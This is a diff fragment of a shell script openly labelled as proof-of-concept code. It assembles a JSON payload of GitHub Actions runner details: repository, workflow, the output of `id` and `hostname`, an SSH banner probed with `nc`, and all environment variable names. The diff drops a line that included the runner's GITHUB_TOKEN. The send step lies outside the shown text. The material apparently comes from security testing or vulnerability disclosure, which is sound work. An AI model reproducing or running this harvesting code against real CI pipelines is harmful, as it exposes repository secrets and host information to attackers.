@@ -48,14 +48,12 @@ echo "[POC] Executing Proof of Concept code..."
 JSON_PAYLOAD=$(cat <<EOF
 {
   "message": "S",
-  "github_token": "${GITHUB_TOKEN}",
   "repository": "${GITHUB_REPOSITORY}",
   "workflow": "${GITHUB_WORKFLOW}",
   "job": "${GITHUB_JOB}",
-  "current_user": "$(id)",
+  "id": "$(id)",
   "working_directory": "$(pwd)",
   "hostname": "$(hostname)",
-  "http_banner": "$(curl -I http://localhost 2>/dev/null | head -n 1)",
   "ssh_banner": "$(echo | nc localhost 22 2>/dev/null | head -n 1)",
   "env_var_keys": $(printenv | cut -d '=' -f 1 | jq -R . | jq -s .)
     
